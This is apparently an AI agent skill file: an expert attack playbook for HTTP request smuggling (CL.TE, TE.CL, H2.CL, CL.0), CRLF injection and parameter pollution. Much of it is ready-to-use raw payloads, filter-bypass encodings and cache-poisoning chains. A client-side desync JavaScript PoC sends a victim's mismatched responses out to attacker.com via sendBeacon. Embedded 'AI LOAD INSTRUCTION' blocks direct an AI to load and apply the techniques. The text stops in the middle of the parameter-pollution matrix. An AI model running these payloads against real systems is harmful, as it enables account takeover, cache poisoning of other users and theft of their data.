---
name: injection-protocol
description: >-
  HTTP protocol-layer injection. Covers request smuggling (CL.TE/TE.CL/CL.0/Fat GET with 8 TE obfuscation variants), HTTP/2 smuggling (H2.CL/H2.TE/HPACK/h2c upgrade), CRLF injection (header splitting/log injection), HTTP parameter pollution (9-platform behavior matrix), HTTP/2 specific attacks, and Email Header Injection (PHP mail() 5th-param RCE, subject splitting, IMAP command injection, SMTP smuggling). Load when HTTP framing anomalies, header injection, or mail header parsing is suspected.
---

<!-- src: hacker/.claude/skills/injection-protocol/SKILL.md -->

# HTTP Protocol-Layer Injection

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Request Smuggling |
| 2 | H2 Smuggling Variants |
| 3 | CRLF Injection |
| 4 | HTTP Parameter Pollution |
| 5 | HTTP/2 Specific Attacks |
| 6 | Email Header Injection (SMTP / IMAP CRLF) |

---
# Part 1: Request Smuggling


# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

Routing note: load this skill when you suspect CDN/reverse-proxy and origin disagree on request-end boundaries, or when abnormal concatenation appears during H2-to-H1 downgrade.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the HTTP client library is **Apache HttpClient <= 4.5.9** (HTTPCLIENT-1974/1978) — injecting `瘍瘊` (U+760D U+760A, low bytes `\r\n`) into a header value causes the underlying char-to-byte writer to emit a literal CRLF, splitting the request at the origin without relying on CL/TE disagreement

## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.


## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---

## 3. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---

## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---

## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

---

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---

## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference

Also load [H2_SMUGGLING_VARIANTS.md](./H2_SMUGGLING_VARIANTS.md) when you need:
- H2.CL and H2.TE variants with byte-level payload examples
- CL.0 (connection close desync) — technique and detection
- Fat GET request smuggling (body in GET request)
- Request smuggling → cache poisoning chain (response queue misalignment)
- Client-side desync (CSD) via browser Fetch API with JavaScript PoC templates
- CDN/reverse proxy product behavior matrix (HAProxy, Nginx, Apache, Cloudflare, AWS ALB, Envoy, Varnish, etc.)

---

## 12. RELATED ROUTING

- **Input enters interpreter/query language/template** (not HTTP framing) -> [Injection Testing Router](../injection-checking/SKILL.md) (then drill down into XSS, SQLi, SSTI, etc.).
- **Response header splitting / Location CRLF** -> [CRLF Injection](../crlf-injection/SKILL.md).
- **Cache and path-key confusion** -> [Web Cache Deception](../web-cache-deception/SKILL.md).

Once confirmed as an **HTTP message-boundary** issue rather than parameter injection, **stay in this skill** to avoid misrouting into general injection workflows.


---
# Part 2: H2 Smuggling Variants


## 1. H2.CL — HTTP/2 Content-Length Desync

### 1.1 Concept

The front-end speaks HTTP/2 with the client and downgrades to HTTP/1.1 toward the back-end. HTTP/2 frames have their own length field (frame length), but the proxy may also forward a `content-length` header to the back-end. If these disagree, the back-end trusts `content-length` while the front-end trusts the H2 frame boundary.

### 1.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - H2 DATA frame containing: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   - content-length header: 0

2. Front-end (H2): reads entire DATA frame as body of first request
   → forwards to back-end as HTTP/1.1 POST

3. Back-end (H1): sees content-length: 0
   → treats body as empty
   → remaining bytes become: "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   → parsed as second request
```

### 1.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

The H2 DATA frame carries the entire body including the smuggled `GET /admin` request. The `content-length: 0` header tells the back-end the POST body is empty.

### 1.4 Confirming H2.CL

```
Step 1: Send H2 POST with content-length: 0 and smuggled prefix "G"
Step 2: Follow immediately with normal GET / on same connection
Step 3: If back-end sees "GGET / HTTP/1.1" → 405 or error → confirmed

Timing version:
- Smuggle "GET /sleep?delay=10 HTTP/1.1..." 
- Subsequent request on same connection delayed → confirmed
```


## 2. H2.TE — HTTP/2 Transfer-Encoding Desync

### 2.1 Concept

HTTP/2 specification forbids `transfer-encoding` in H2 frames. However, some front-end proxies don't strip it when downgrading to H1. If the back-end sees `transfer-encoding: chunked` in the downgraded H1 request, it uses chunked parsing while the front-end used H2 frame boundaries.

### 2.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - transfer-encoding: chunked  (forbidden in H2, but proxy passes it through)
   - H2 DATA frame body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"

2. Front-end: ignores transfer-encoding (H2 doesn't use it)
   → forwards entire DATA frame as H1 body

3. Back-end: sees transfer-encoding: chunked
   → parses "0\r\n\r\n" as end-of-chunks
   → remaining bytes = smuggled request
```

### 2.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example

```

### 2.4 Variations

Some proxies normalize the `transfer-encoding` header. Try obfuscations:

```http
transfer-encoding: chunked
Transfer-Encoding: chunked      (capitalized — H2 requires lowercase)
transfer-encoding: identity     (should be stripped but may pass)
transfer-encoding:  chunked     (extra space)
transfer-encoding: chunked\r\n  (trailing whitespace)
```

---

## 3. CL.0 — CONNECTION CLOSE DESYNC

### 3.1 Concept

CL.0 occurs when the back-end ignores the `content-length` header entirely and reads the body length as 0 — regardless of what `content-length` says. The remaining body bytes stay in the socket buffer for the next request.

Unlike CL.TE or TE.CL, CL.0 does NOT require `transfer-encoding`. It exploits endpoints that simply don't consume the body.

### 3.2 Vulnerable Conditions

- Endpoints that return a response before reading the full body (e.g., redirects, 301/302)
- Static file servers that ignore POST body
- Health-check endpoints
- Endpoints behind `Connection: close` that reuse the socket anyway

### 3.3 Attack Flow

```
1. Send POST to endpoint that ignores body:
   POST /redirect-page HTTP/1.1
   Host: target.example
   Content-Length: 30

   GET /admin HTTP/1.1
   X: x

2. Back-end sends 301 redirect immediately without consuming body
3. The "GET /admin HTTP/1.1\r\nX: x" remains in socket buffer
4. Next request on this connection is prepended with smuggled bytes
```

### 3.4 Detection

```bash
# Step 1: Find endpoints that respond without consuming body
# Candidates: redirects, 204, static pages serving POST

# Step 2: Send POST with Content-Length larger than actual body
curl -X POST https://target.com/static-page \
  -H "Content-Length: 50" \
  -d "GET /canary HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  --http1.1

# Step 3: Send follow-up request on same connection
# If response matches /canary instead of expected page → CL.0 confirmed
```

### 3.5 Key Differences from CL.TE

| Aspect | CL.TE | CL.0 |
|---|---|---|
| Requires TE header | Yes | No |
| Front/back disagreement | CL vs TE | CL vs "ignore body" |
| Works without chunked support | No | Yes |
| Common targets | Proxies parsing TE | Static servers, redirect endpoints |

---

## 4. FAT GET REQUEST SMUGGLING

### 4.1 Concept

Some reverse proxies allow GET requests with a body (RFC 7230 permits but discourages it). The front-end may forward the body, but the back-end may ignore it for GET requests, leaving body bytes in the buffer.

### 4.2 Payload

```http
GET / HTTP/1.1
Host: target.example
Content-Length: 55

GET /admin HTTP/1.1
Host: target.example
Cookie: admin=true

```

### 4.3 Behavior Matrix

| Proxy/Server | GET Body Behavior |
|---|---|
| Nginx (as proxy) | Forwards body to back-end |
| Apache (as proxy) | Usually forwards body |
| HAProxy | Forwards body by default |
| AWS ALB | May strip body on GET |
| Cloudflare | May strip body on GET |
| Express.js (back-end) | Ignores GET body by default |
| Gunicorn (back-end) | Ignores GET body |
| PHP-FPM | Ignores GET body |

When front-end forwards and back-end ignores → desync.

### 4.4 Combined with Cache

```http
GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 70

GET /admin/delete-user?id=1 HTTP/1.1
Host: target.example
Cookie: admin=true

```

If the proxy caches `/static/app.js` responses, the smuggled request's response may get cached under `/static/app.js`.

---

## 5. REQUEST SMUGGLING → CACHE POISONING CHAIN

### 5.1 The Chain

```
1. Attacker smuggles a request that returns malicious content
2. The smuggled response is associated with a cacheable URL by the front-end
3. Cache stores malicious response under legitimate URL
4. All subsequent users requesting that URL get poisoned content
```

### 5.2 CL.TE → Cache Poisoning Example

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 10

x=1
```

**What happens**:
1. Front-end (CL): sends everything as one POST request
2. Back-end (TE): sees POST end at `0\r\n\r\n`, then `GET /static/app.js` as new request
3. Back-end responds to smuggled `GET /static/app.js` — but its response gets matched to the **next legitimate request** on the same connection
4. If next legitimate request is for `/static/app.js` → cache stores the matched response → poisoned

### 5.3 Targeted Poisoning

To control WHAT gets cached, smuggle a request that returns attacker-controlled content:

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 200
Transfer-Encoding: chunked

0

GET /redirect?url=https://evil.com/malicious.js HTTP/1.1
Host: target.example
X-Ignore: x
```

If `/redirect` returns a 302 or 301 to `evil.com`, and the cache stores this for the next request's URL, that URL now redirects to `evil.com` for all users.

### 5.4 Cache Poisoning via Response Queue Misalignment

```
Connection:
  Request A (smuggled) → Response A
  Request B (victim's) → Response B

Cache expects:
  Request B's URL → Response B

Actual:
  Request B's URL → Response A (wrong response)
  
If Response A contains XSS or redirect → cached under Request B's URL
```

---

## 6. CLIENT-SIDE DESYNC (CSD)

### 6.1 Concept

Client-Side Desync exploits browser `fetch()` API behavior to cause desynchronization between the browser and a web server. Unlike server-side smuggling (which poisons a shared connection pool), CSD poisons the **browser's own connection** to the target.

### 6.2 Prerequisites

1. Target server reuses connections (not `Connection: close` on every response)
2. A page on the target (or same-site) where attacker can inject JavaScript
3. The server has an endpoint that doesn't consume the full request body (CL.0-style)

### 6.3 Detailed Flow

```
1. Attacker's JS on victim's browser sends fetch() to target:

   fetch('https://target.com/trigger', {
     method: 'POST',
     mode: 'no-cors',
     credentials: 'include',
     body: 'GET /victim-data HTTP/1.1\r\nHost: target.com\r\n\r\n'
   });

2. Browser sends POST to /trigger with body containing smuggled GET
3. Server responds to POST immediately (ignoring body — CL.0)
4. Smuggled "GET /victim-data" remains in the TCP buffer

5. Attacker's JS sends a follow-up request on same connection:

   fetch('https://target.com/api/me', {
     credentials: 'include'
   });

6. Server processes the leftover "GET /victim-data" instead of "GET /api/me"
7. Response mismatch — browser gets /victim-data response for /api/me request
```

### 6.4 JavaScript PoC Template

```javascript
async function desync(targetUrl, triggerPath, smuggledRequest) {
    const body = smuggledRequest;

    // Step 1: Trigger the desync (CL.0 on trigger endpoint)
    await fetch(targetUrl + triggerPath, {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: body
    });

    // Step 2: Follow-up request on (hopefully) same connection
    const response = await fetch(targetUrl + '/api/profile', {
        credentials: 'include'
    });

    // Step 3: Exfiltrate if response is mismatched
    const data = await response.text();
    navigator.sendBeacon('https://attacker.com/log', data);
}

desync(
    'https://target.com',
    '/static/logo.png',  // CL.0-susceptible endpoint
    'GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n'
);
```

### 6.5 CSD Limitations

- Browser may use different connections for subsequent requests → desync fails
- `Connection: close` on server side prevents reuse
- HTTP/2 to single origin may use single connection (actually helps CSD)
- Same-site cookie policies may limit credential inclusion
- Hard to reliably predict connection reuse

### 6.6 CSD via Pause-Based Desync

```
1. Server has a timeout: if request body isn't fully received within N seconds, 
   server sends response and moves on
2. Attacker sends fetch() with:
   - Content-Length: 1000 (large)
   - Actual body: only 50 bytes + smuggled request
3. Server waits, times out, responds to partial request
4. Remaining bytes (smuggled request) stay in buffer
5. Next request on connection processes smuggled bytes
```

---

## 7. CDN / REVERSE PROXY BEHAVIOR MATRIX

### 7.1 CL + TE Handling

| Product | Dual CL+TE | Prefers | Notes |
|---|---|---|---|
| **HAProxy** | Forwards both | TE | Strips CL when TE is present (configurable) |
| **Nginx** | Rejects dual headers (400) | N/A | Strict — hard to smuggle through |
| **Apache (mod_proxy)** | Forwards both | CL | Historic CL.TE source |
| **Cloudflare** | Normalizes | TE | Strips CL when TE present; strong normalization |
| **AWS ALB** | Normalizes | Varies | Has had CL.TE vulns historically (patched) |
| **AWS CloudFront** | Normalizes | CL | May pass TE obfuscation variants |
| **Varnish** | Forwards both | TE | Configurable; default prefers TE |
| **Traefik** | Forwards both | TE | Go `net/http` based; strict chunked parsing |
| **Envoy** | Rejects dual (400) | N/A | Very strict HTTP/1.1 parsing |
| **Caddy** | Go-based; strict | TE | Similar to Envoy strictness |
| **Squid** | Forwards both | CL | Historic TE.CL source |
| **IIS (ARR)** | Forwards both | CL | Historic CL.TE/TE.CL source |

### 7.2 HTTP/2 Downgrade Behavior

| Product | H2→H1 Downgrade | TE Header Handling | CL Passthrough |
|---|---|---|---|
| **HAProxy** | Translates | May pass TE | Passes CL |
| **Nginx** | Translates | Strips TE (usually) | Passes CL |
| **Cloudflare** | Translates | Strips TE | Normalizes CL |
| **AWS ALB** | Translates | Strips TE | Passes CL |
| **AWS CloudFront** | Translates | May pass obfuscated TE | Passes CL |
| **Envoy** | Translates | Strips TE | Strict validation |
| **Traefik** | Translates | May pass TE | Passes CL |

### 7.3 GET Body Handling

| Product | Forwards GET Body | Notes |
|---|---|---|
| HAProxy | Yes | Default behavior |
| Nginx | Yes (as proxy) | Forwards if body present |
| Apache | Yes | Forwards body |
| Cloudflare | Strips | Removes GET body |
| AWS ALB | Depends on version | May strip |
| Varnish | Strips | Removes GET body |
| Envoy | Yes | Forwards |

### 7.4 Connection Reuse Behavior

| Product | Backend Connection Pooling | Impact on Smuggling |
|---|---|---|
| HAProxy | Yes (connection pool) | High risk — smuggled data affects other users |
| Nginx | Yes (keepalive upstream) | High risk |
| Cloudflare | Yes | High risk but strong normalization |
| AWS ALB | Yes | High risk |
| Envoy | Yes | Lower risk (strict parsing) |
| Varnish | Configurable | Depends on `beresp.do_stream` |

---

## 8. TESTING METHODOLOGY

### 8.1 Safe Probe Sequence

```
1. Identify architecture:
   - Check Via, Server, X-Served-By headers
   - Detect CDN (Cloudflare cf-ray, CloudFront x-amz-cf-id, etc.)

2. HTTP version probing:
   - curl --http2 https://target.com -v
   - Check if ALPN negotiation includes h2

3. Time-based desync detection:
   a. CL.TE probe:
      POST / HTTP/1.1
      Content-Length: 4
      Transfer-Encoding: chunked

      1
      A
      0

   b. If response is delayed → back-end is waiting for chunked end → CL.TE likely

4. H2 desync:
   - Send H2 request with content-length: 0 + body containing smuggled prefix
   - Follow with normal request; observe if response matches smuggled path

5. CL.0 detection:
   - Find endpoints returning without consuming body (redirects, static files)
   - Send POST with excess body, follow with normal GET
```

### 8.2 Tools

| Tool | Purpose |
|---|---|
| **Burp Suite HTTP Request Smuggler** | Automated variant scanning |
| **h2csmuggler** (GitHub) | HTTP/2 cleartext smuggling |
| **smuggler.py** (defparam) | CL.TE, TE.CL, TE.TE automation |
| **http2smugl** (GitHub) | H2-specific desync testing |
| **curl** with `--http2` / `--http1.1` | Manual H2/H1 probing |
| **hyper** (Python) | Low-level H2 frame crafting |

### 8.3 Impact Escalation Checklist

```
□ Confirmed desync variant (CL.TE / TE.CL / H2.CL / H2.TE / CL.0)
□ Can smuggle full request? (not just prefix)
□ Connection pooling enabled? (affects other users → critical)
□ Cacheable endpoints exist? (→ cache poisoning)
□ Authenticated endpoints reachable? (→ auth bypass, data theft)
□ Can reflect content in response? (→ stored XSS via cache)
□ Admin/internal paths accessible? (→ privilege escalation)
□ Client-side desync possible? (→ per-user attacks)
```


---
# Part 3: CRLF Injection


# SKILL: CRLF Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: CRLF injection (HTTP response splitting) techniques. Covers header injection, response body injection via double CRLF, XSS escalation, cache poisoning, and encoding bypass. Often overlooked by scanners but chains into XSS, session fixation, and cache attacks.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the target is a **Java service** and `%0D%0A` / `\r\n` encodings are WAF-blocked — substituting `瘍` (U+760D, low byte `\r`) and `瘊` (U+760A, low byte `\n`) injects a real CRLF through Angus Mail / Jakarta Mail SMTP, Apache HttpClient headers, JDK HttpServer responses, and ActiveJ HTTP (re-enables Jira CVE-2025-57733 and JDK CVE-2026-21933 classes)

## 1. CORE CONCEPT

CRLF = `\r\n` (Carriage Return + Line Feed, `%0D%0A`). HTTP headers are separated by CRLF. If user input is reflected in a response header without sanitization, injecting CRLF characters creates new headers or even a response body.

```
Normal: Location: /page?url=USER_INPUT
Attack: Location: /page?url=%0D%0ASet-Cookie:admin=true
Result: Two headers — Location + injected Set-Cookie
```


## 2. DETECTION

### Basic Probe

```text
%0D%0ANew-Header:injected

# In URL parameter:
https://target.com/redirect?url=%0D%0AX-Injected:true

# Check response headers for "X-Injected: true"
```

### Double CRLF — Body Injection

Two consecutive CRLF sequences end headers and start body:

```text
%0D%0A%0D%0A<script>alert(1)</script>

# Result:
HTTP/1.1 302 Found
Location: /page

<script>alert(1)</script>
```

---

## 3. EXPLOITATION SCENARIOS

### Session Fixation via Set-Cookie

```text
%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id
```

### XSS via Response Body

```text
%0D%0A%0D%0A<html><script>alert(document.cookie)</script></html>
```

### Cache Poisoning

If the response is cached by a CDN or proxy, injected headers/body are served to all users:

```text
GET /page?q=%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0A%0D%0A<script>alert(1)</script>
```

### Log Injection

CRLF in log-visible fields (User-Agent, Referer) can forge log entries:

```text
User-Agent: normal%0D%0A127.0.0.1 - admin [date] "GET /admin" 200
```

---

## 4. FILTER BYPASS

| Filter | Bypass |
|---|---|
| Blocks `%0D%0A` | Try `%0D` alone, `%0A` alone, or `%E5%98%8A%E5%98%8D` (Unicode) |
| URL decodes once | Double-encode: `%250D%250A` |
| Strips `\r\n` literally | Use URL-encoded form |
| Blocks in value only | Inject in parameter name |

```text
# Unicode/UTF-8 bypass:
%E5%98%8A%E5%98%8D  → decoded as CRLF in some parsers

# Double URL encoding:
%250D%250A → server decodes to %0D%0A → interpreted as CRLF

# Partial injection (LF only):
%0A → some servers accept LF without CR
```

---

## 5. REAL-WORLD EXPLOITATION CHAINS

### CRLF + Session Fixation

```text
# Inject Set-Cookie via CRLF in redirect parameter:
?url=%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id

# Result:
HTTP/1.1 302 Found
Location: /page
Set-Cookie: PHPSESSID=attacker_controlled_session_id

# Victim uses attacker's session → attacker hijacks after login
```

### CRLF → XSS via Double CRLF Body Injection

```text
# Two CRLF sequences end headers and inject response body:
?url=%0D%0A%0D%0A<script>alert(document.cookie)</script>

# Result:
HTTP/1.1 302 Found
Location: /page

<script>alert(document.cookie)</script>
```

### CRLF in 302 Location → Redirect Hijack

```text
# Inject new Location header before the original:
?url=%0D%0ALocation:http://evil.com%0D%0A%0D%0A

# Some servers use the LAST Location header → redirect to evil.com
```

---

## 6. COMMON VULNERABLE PATTERNS

```php
// PHP — header() with user input (PHP < 5.1.2 vulnerable):
header("Location: " . $_GET['url']);

// Python — redirect with unsanitized input:
return redirect(request.args.get('next'))

// Node.js — setHeader with user input:
res.setHeader('X-Custom', userInput);

// Java — response.setHeader with user input:
response.setHeader("Location", request.getParameter("url"));
```

---

## 7. TESTING CHECKLIST

```
□ Inject %0D%0A in redirect URL parameters
□ Inject %0D%0A in Set-Cookie name/value paths
□ Try double CRLF for body injection → XSS
□ Test encoding bypasses: double-encode, Unicode (%E5%98%8D%E5%98%8A), LF-only (%0A)
□ Check if response is cacheable → cache poisoning
□ Test in User-Agent / Referer for log injection
□ Test CRLF + Set-Cookie for session fixation
□ Verify if Location header can be injected in 302 responses
```


---
# Part 4: HTTP Parameter Pollution


# SKILL: HTTP Parameter Pollution (HPP)

> **AI LOAD INSTRUCTION**: Model the **full request path**: browser → CDN/WAF → reverse proxy → app framework → business code. Duplicate keys (`a=1&a=2`) are not an error at HTTP level; each hop may pick first, last, join, or array-ify. Test HPP when WAF and app disagree, or when internal HTTP clients rebuild query strings. Routing note: when the same parameter appears multiple times, or WAF/backend stacks differ, use the Section 1 matrix to test first/last/merge assumptions, then design Section 3 scenario chains.

## 0. QUICK START

**Hypothesis**: the **security check** reads one occurrence of a parameter while the **action** reads another.

### First-pass payloads

```text
id=1&id=2
id=1&id=1%20OR%201=1
url=https://legit.example&id=https://evil.example
amount=1&amount=9999
csrf=TOKEN_A&csrf=TOKEN_B
user=alice&user=admin
```

### Body variants (repeat for POST)

```text
application/x-www-form-urlencoded
id=1&id=2

multipart/form-data
------boundary
Content-Disposition: form-data; name="id"
1
------boundary
Content-Disposition: form-data; name="id"
2
```

### Quick methodology

1. Fingerprint **front** stack (CDN/WAF) vs **origin** (language/framework) using baseline `a=1&a=2`.
2. Send **both** orders: `a=1&a=2` and `a=2&a=1` (some parsers are order-sensitive).
3. If JSON: test **duplicate keys** and Content-Type confusion (see Section 2).


## 1. SERVER BEHAVIOR MATRIX

Typical defaults — **always confirm**; middleware and custom parsers override these.

| Technology | Behavior | Example: `a=1&a=2` |
|---|---|---|
| PHP / Apache (`$_GET`) | Last occurrence | `a=2` |
| ASP.NET / IIS | Often comma-joined (all) | `a=1,2` |
